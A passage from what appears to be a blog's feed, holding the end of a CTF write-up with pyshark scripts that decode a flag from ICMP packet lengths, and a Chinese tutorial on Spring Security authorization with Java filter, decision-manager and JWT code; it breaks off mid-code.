Length</span></h4><ul><li><p>题目提示，flag暗藏玄只因。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">'icmp_len.pcap'</span>,display_filter=<span class="string">'icmp &amp;&amp; icmp.type==8'</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">18</span>):</span><br><span class="line">    pkt = cap[i]</span><br><span class="line">    flag+=(chr(int(pkt.icmp.data_len)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="icmp-lengthbin">ICMP LengthBin</span></h4><ul><li><p>题目很直接的给了提示，就是二进制与length的关系，使用wireshark打开流量包查看，使用过滤器icmp&amp;&amp; icmp.type==8来进行过滤，查看每一条流量的length值，发现都是32或64，直接编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">'icmp_len_binary.pcap'</span>, display_filter=<span class="string">"icmp &amp;&amp; icmp.type==8"</span>)</span><br><span class="line">cap.load_packets()</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">con1 = <span class="string">""</span></span><br><span class="line">con2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cap)):</span><br><span class="line">    <span class="keyword">if</span> cap[i].icmp.data_len == <span class="string">'32'</span>:</span><br><span class="line">        con1 += <span class="string">'0'</span></span><br><span class="line">        con2 += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">elif</span> cap[i].icmp.data_len == <span class="string">'64'</span>:</span><br><span class="line">        con1 += <span class="string">'1'</span></span><br><span class="line">        con2 += <span class="string">'0'</span></span><br><span class="line">print(binascii.a2b_hex(hex(int(con1, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line">print(binascii.a2b_hex(hex(int(con2, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Security</title>
      <link href="/2022/12/23/Spring%20Security/"/>
      <url>/2022/12/23/Spring%20Security/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#基于cookie与session的方案">基于Cookie与Session的方案</a></li><li><a href="#基于jwt的方案">基于jwt的方案</a></li><li><a href="#基于自定义tokenredis">基于自定义Token+Redis</a></li><li><a href="#技术路线">技术路线</a><ul><li><a href="#鉴权">鉴权</a></li></ul></li><li><a href="#用户权限">用户权限</a></li><li><a href="#鉴权规则源">鉴权规则源</a></li><li><a href="#授权管理">授权管理</a></li><li><a href="#授权错误处理器">授权错误处理器</a></li><li><a href="#配置授权过滤器">配置授权过滤器</a></li><li><a href="#配置spring-security">配置Spring Security</a></li></ul><!-- tocstop --><p><a href="https://tianjiashu.github.io/category/Spring/" target="_blank" rel="noopener">认证部分可以看具体笔记</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e97557e4960243a3942059939cdacacb~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp?" alt="Spring Security过滤链"></p><p><strong>图中只展示了核心过滤器</strong>，其它的非核心过滤器并没有在图中展示。</p><ul><li><code>UsernamePasswordAuthenticationFilter</code>:负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。【判断你的用户名和密码是否正确】</li><li><code>ExceptionTranslationFilter</code>：处理过滤器链中抛出的任何<code>AccessDeniedException</code>和<code>AuthenticationException</code> 。【处理认证授权过程中的所有异常，方便统一处理】</li><li><code>FilterSecurityInterceptor</code>：负责权限校验的过滤器。【它会判断你登录成功的用户是“谁”，“你”具有什么权限，当前访问的资源需要什么权限】</li></ul><p>过程详解：</p><p>当前端提交用户名和密码过来时，进入了<code>UsernamePasswordAuthenticationFilter</code>过滤器。</p><ul><li><p>在<code>UsernamePasswordAuthenticationFilter</code>过滤器里，将传进来的用户名和密码被封装成了<strong><code>Authentication</code></strong>对象【这时候最多只有用户名和密码，权限还没有】，<strong><code>Authentication</code></strong>对象通过<strong><code>ProviderManager</code>的<code>authenticate</code>方法</strong>进行认证。</p><ul><li><p>在<strong><code>ProviderManager</code></strong>里面，通过调用<code>DaoAuthenticationProvider</code>的<code>authenticate</code>方法进行认证。</p><ul><li><p>在<code>DaoAuthenticationProvider</code>里，调用<strong><code>InMemoryUserDetailsManager</code>的<code>loadUserByUsername</code>方法</strong>查询用户。【传入的参数只有<strong>用户名字符串</strong>】</p><ul><li><p>在</p><p><strong><code>InMemoryUserDetailsManager</code>的<code>loadUserByUsername</code>方法</strong></p><p>里执行了以下操作</p><ol><li>根据用户名查询对于用户以及这个用户的权限信息【<strong>在内存里查</strong>】</li><li>把对应的用户信息包括权限信息封装成<strong><code>UserDetails</code>对象</strong>。</li><li>返回<strong><code>UserDetails</code>对象</strong>。</li></ol></li></ul></li><li><p>返回给了<code>DaoAuthenticationProvider</code>，在这个对象里执行了以下操作</p><ol><li>通过<strong><code>PasswordEncoder</code></strong>对比<strong><code>UserDetails</code></strong>中的密码和<strong><code>Authentication</code></strong>密码是否正确。【<strong>校验密码（经过加密的）</strong>】</li><li>如果正确就把<strong><code>UserDetails</code></strong>的<strong>权限信息</strong>设置到<strong><code>Authentication</code></strong>对象中。</li><li>返回<strong><code>Authentication</code></strong>对象。</li></ol></li></ul></li></ul></li><li><p>又回到了过滤器里面<code>UsernamePasswordAuthenticationFilter</code>。</p><ol><li><p>如果上一步返回了<strong><code>Authentication</code></strong>对象</p><p>就使用<strong><code>SecurityContextHolder.getContext().setAuthentication()</code></strong>方法存储对象。</p><p><strong>其他过滤器</strong>会通过<code>SecurityContextHolder</code>来获取当前用户信息。【当前过滤器认证完了，后面的过滤器还需要获取用户信息，比如授权过滤器】</p></li></ol></li></ul><blockquote><p>彩色字体的类均是比较重要的<strong>接口</strong>，在实现认证的过程中均需要自定义一个类来重新实现或者变更为Spring中其他实现类。</p></blockquote><p>概念速查：</p><ul><li><strong><code>Authentication</code></strong>接口: 它的实现类，表示当前访问系统的用户，<strong>封装了用户的权限等相关信息。</strong></li><li><strong><code>AuthenticationManager</code></strong>接口：定义了认证Authentication的方法 ,实现类是<strong><code>ProviderManager</code></strong><ul><li>它的实现类是<strong><code>ProviderManager</code></strong>，它的功能主要是实现<strong>认证用户</strong>，因为在写登录接口时，可以通过配置类的方式，注入Spring容器中来使用它的<strong><code>authenticate</code>方法</strong>。</li></ul></li><li><strong><code>UserDetailsService</code></strong>接口：加载用户特定数据的核心接口。里面定义了一个<strong>根据用户名查询用户信息的方法</strong>。<ul><li>原本的实现类是<strong><code>InMemoryUserDetailsManager</code></strong>，它是在内存中查询，因为我们需要自定义改接口。</li></ul></li><li><strong><code>UserDetails</code></strong>接口：提供核心用户信息。通过<strong><code>UserDetailsService</code></strong>根据用户名获取处理的用户信息要封装成<strong><code>UserDetails</code></strong>对象返回。然后将这些信息封装到<strong><code>Authentication</code></strong>对象中。<ul><li>当我们自定义<strong><code>UserDetailsService</code></strong>接口时，需要我们定义一个<strong>实体类</strong>来实现这个接口来供<strong><code>UserDetailsService</code></strong>接口返回。【注意是实体类】</li></ul></li></ul><h3><span id="基于cookie与session的方案">基于Cookie与Session的方案</span></h3><ul><li>优点：实现简单，成熟</li><li>缺点：集群情况下实现困难，反向代理配置繁琐，移动端不友好</li></ul><h3><span id="基于jwt的方案">基于jwt的方案</span></h3><ul><li>优点：无状态，服务器资源占用小，天生支持分布式，实现简单</li><li>缺点：安全性不高，jwt没办法实现过期将用户踢下线，只能前端实现，但是jwt在有效期内依然有效。</li></ul><h3><span id="基于自定义tokenredis">基于自定义Token+Redis</span></h3><ul><li>优点：服务器可以实现对用户的下线等操作，支持分布式</li><li>缺点：相比jwt是中心化方案，对服务器存储有要求，分布式需要用到Redis</li></ul><h3><span id="技术路线">技术路线</span></h3><ul><li>可以使用controller，然后不使用formlogin就不会注入UserPasswordAuthenticationFilter（比较灵活，实现拓展功能比较简单）</li><li>也可以重写UserPasswordAuthenticationFilter，然后重写它的认证成功，失败接口</li></ul><h2><span id="鉴权">鉴权</span></h2><p>鉴权发生在认证之后，因此鉴权入口在<strong>FilterSecurityInterceptor</strong>中，<a href="https://juejin.cn/post/6847902222668431368" target="_blank" rel="noopener">原理</a>不多赘述，有三种实现方法。</p><ol><li>直接重写一个<code>AccessDecisionManager</code>，将它用作默认的<code>AccessDecisionManager</code>，并在里面直接写好鉴权逻辑。</li><li>再比如重写一个投票器，将它放到默认的<code>AccessDecisionManager</code>里面，和之前一样用投票器鉴权。</li><li>我看网上还有些博客直接去做<code>FilterSecurityInterceptor</code>的改动。</li></ol><h3><span id="用户权限">用户权限</span></h3><blockquote><p>UserUserDetails 用户权限</p><p>GrantedAuthority 一般使用实现类SimpleGrantedAuthority就够了</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 当更新Admin时，传入的authorities是JSON格式，而getAuthorities()</span></span><br><span class="line"><span class="comment"> * 需要Collection&lt;? extends GrantedAuthority&gt; 格式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 自定义JSON反序列化</span></span><br><span class="line"><span class="comment"> * CustomAuthorityDeserializer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@JsonDeserialize</span>(using = CustomAuthorityDeserializer<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">Collection</span>&lt;? <span class="keyword">extends</span> <span class="title">GrantedAuthority</span>&gt; <span class="title">getAuthorities</span>() </span>&#123;</span><br><span class="line">    List&lt;SimpleGrantedAuthority&gt; authorities = roles</span><br><span class="line">            .stream()</span><br><span class="line">            .map(role -&gt; <span class="keyword">new</span> SimpleGrantedAuthority(role.getName()))</span><br><span class="line">            .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> authorities;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="鉴权规则源">鉴权规则源</span></h3><blockquote><p>FilterInvocationSecurityMetadataSource 鉴权规则源</p><p>用于返回当前API所需的ROLE</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 菜单权限控制</span></span><br><span class="line"><span class="comment"> * 根据请求url分析请求所需的角色</span></span><br><span class="line"><span class="comment"> * 访问该url资源所需角色</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomFilter</span> <span class="keyword">implements</span> <span class="title">FilterInvocationSecurityMetadataSource</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IMenuService menuService;</span><br><span class="line"></span><br><span class="line">    AntPathMatcher antPathMatcher = <span class="keyword">new</span> AntPathMatcher();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据request请求获取访问资源所需权限</span></span><br><span class="line"><span class="comment">     * 用户GrantedAuthority与ConfigAttribute一对比就知道用户有没有权限访问该api了</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title">getAttributes</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IllegalArgumentException </span>&#123;</span><br><span class="line">        <span class="comment">//获取请求的url</span></span><br><span class="line">        String requestUrl = ((FilterInvocation) o).getRequestUrl();</span><br><span class="line">        List&lt;Menu&gt; menus = menuService.getMenusWithRole();</span><br><span class="line">        <span class="keyword">for</span> (Menu menu : menus) &#123;</span><br><span class="line">            <span class="comment">//判断请求url与菜单角色是否匹配</span></span><br><span class="line">            <span class="keyword">if</span> (antPathMatcher.match(menu.getUrl(),requestUrl)) &#123;</span><br><span class="line">                <span class="comment">//得到rname，并将其放入一个string集合中,一个url可能对应多个角色</span></span><br><span class="line">                String[] str = menu.getRoles().stream().map(Role::getName).toArray(String[]::<span class="keyword">new</span>);</span><br><span class="line">                <span class="comment">//将得到的角色放入List里</span></span><br><span class="line">                <span class="keyword">return</span> SecurityConfig.createList(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//给一个默认登录即可访问角色</span></span><br><span class="line">        <span class="keyword">return</span> SecurityConfig.createList(<span class="string">"ROLE_LOGIN"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title">getAllConfigAttributes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supports</span><span class="params">(Class&lt;?&gt; aClass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="授权管理">授权管理</span></h3><blockquote><p>AccessDecisionManager</p><p>用户GrantedAuthority与ConfigAttribute一对比就知道用户有没有权限访问该api了</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authentication authentication</span></span><br><span class="line"><span class="comment"> * 认证之后的身份</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Object o</span></span><br><span class="line"><span class="comment"> * Object对象这里是要访问的受保护资源，他是一个FilterInvocation类型,你可以通过这个对象获取当前所访问的路径</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Collection&lt;ConfigAttribute&gt; configAttributes</span></span><br><span class="line"><span class="comment"> * Collection集合就是要操作当前资源，所需要的角色。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/weixin_43836204/article/details/106310730</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decide</span><span class="params">(Authentication authentication, Object o, Collection&lt;ConfigAttribute&gt; configAttributes)</span> <span class="keyword">throws</span> AccessDeniedException, InsufficientAuthenticationException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (ConfigAttribute attribute : configAttributes) &#123;</span><br><span class="line">        <span class="comment">//当前url资源所需角色</span></span><br><span class="line">        String needRole = attribute.getAttribute();</span><br><span class="line">        <span class="comment">//判断用户角色是否为url所需角色</span></span><br><span class="line">        Collection&lt;? extends GrantedAuthority&gt; authorities = authentication.getAuthorities();</span><br><span class="line">        <span class="keyword">for</span> (GrantedAuthority authority : authorities) &#123;</span><br><span class="line">            <span class="keyword">if</span> (authority.getAuthority().equals(needRole)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断角色是否是登录即可访问的角色，此角色在CustomFilter中设置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"ROLE_LOGIN"</span>.equals(needRole)) &#123;</span><br><span class="line">            <span class="comment">//判断是否登录</span></span><br><span class="line">            <span class="keyword">if</span> (authentication <span class="keyword">instanceof</span> AnonymousAuthenticationToken) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> AccessDeniedException(<span class="string">"尚未登录，请登录"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> AccessDeniedException(<span class="string">"权限不足，请联系管理员"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="授权错误处理器">授权错误处理器</span></h3><blockquote><p>AccessDeniedHandler</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 当访问接口没权限时，自定义返回结果</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 15:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RestfulAccessDeniedHandler</span> <span class="keyword">implements</span> <span class="title">AccessDeniedHandler</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AccessDeniedException e)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        httpServletResponse.setCharacterEncoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">        httpServletResponse.setContentType(<span class="string">"application/json"</span>);</span><br><span class="line">        PrintWriter out = httpServletResponse.getWriter();</span><br><span class="line">        RespBean bean = RespBean.error(<span class="string">"权限不足，请联系管理员！"</span>);</span><br><span class="line">        bean.setCode(<span class="number">403</span>);</span><br><span class="line">        out.write(<span class="keyword">new</span> ObjectMapper().writeValueAsString(bean));</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="配置授权过滤器">配置授权过滤器</span></h3><blockquote><p>OncePerRequestFilter</p></blockquote><ul><li>jwt版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.disda.cowork.config.security.components;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.UsernamePasswordAuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.WebAuthenticationDetailsSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: jwt 登录授权过滤器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtAuthenticationTokenFilter</span> <span class="keyword">extends</span> <span class="title">OncePerRequestFilter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;jwt.tokenHeader&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String tokenHeader;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;jwt.tokenHead&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String tokenHead;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtTokenUtil jwtTokenUtil;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDetailsService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 浏览器传过来的request请求中</span></span><br><span class="line"><span class="comment">         * key value</span></span><br><span class="line"><span class="comment">         * key为配置中的tokenHeader</span></span><br><span class="line"><span class="comment">         * value为配置中的tokenHead+空格+token</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        String authHeader = request.getHeader(tokenHeader);</span><br><span class="line">        <span class="comment">// 存在token</span></span><br><span class="line">        <span class="keyword">if</span>(authHeader!=<span class="keyword">null</span>&amp;&amp;authHeader.startsWith(tokenHead))&#123;</span><br><span class="line">            String authToken = authHeader.substring(tokenHead.length());</span><br><span class="line">            String username = jwtTokenUtil.getUserNameFromToken(authToken);</span><br><span class="line">            <span class="comment">// token存在用户名，但是未登录</span></span><br><span class="line">            <span class="keyword">if</span>(username!=<span class="keyword">null</span> &amp;&amp; SecurityContextHolder.getContext().getAuthentication() == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="comment">// 登录</span></span><br><span class="line">                UserDetails userDetails = userDetailsService.loadUserByUsername(username);</span><br><span class="line">                <span class="comment">// 验证Token是否有效，重新设置用户对象</span></span><br><span class="line">                <span class="keyword">if</span>(jwtTokenUtil.validateToken(authToken,userDetails))&#123;</span><br><span class="line">                    UsernamePasswordAuthenticationToken authenticationToken = <span class="keyword">new</span> UsernamePasswordAuthenticationToken(userDetails,<span class="keyword">null</span>,userDetails.getAuthorities());</span><br><span class="line">                    authenticationToken.setDetails(<span class="keyword">new</span> WebAuthenticationDetailsSource().buildDetails(request));</span><br><span class="line">                    SecurityContextHolder.getContext().setAuthentication(authenticationToken);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="配置spring-security">配置Spring Security</span></h3><blockquote><p>SecurityConfig extends WebSecurityConfigurerAdapter</p></blockquote><ul><li>jwt版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 